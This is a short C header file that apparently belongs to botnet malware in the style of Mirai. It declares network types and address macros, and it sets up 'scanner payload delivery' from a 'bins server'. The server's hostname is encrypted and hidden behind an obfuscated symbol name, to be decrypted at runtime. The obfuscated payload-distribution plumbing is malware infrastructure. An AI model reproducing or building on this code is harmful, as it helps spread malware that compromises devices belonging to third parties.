#pragma once

#include "strenc.h"

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>

#ifndef TRUE
#define TRUE 1
#endif
#ifndef FALSE
#define FALSE 0
#endif

typedef int BOOL;
typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#ifndef LOCAL_ADDR
#define LOCAL_ADDR 0x00000000
#endif

#ifndef INET_ADDR
#define INET_ADDR(o1,o2,o3,o4) (htonl( ((o1)<<24) | ((o2)<<16) | ((o3)<<8) | (o4) ))
#endif

/* Scanner payload delivery — bins server + per-scanner binary names.
   Defined in config.c, overridable at compile time with -D flags. */
/* SCANNER_BINS_HOST — decrypted at runtime from encrypted blob in config.c.
   Exposed as a plain char* for scanner modules that don't include bot.h. */
extern const char *_Gy7MD4D;
#define SCANNER_BINS_HOST _Gy7MD4D
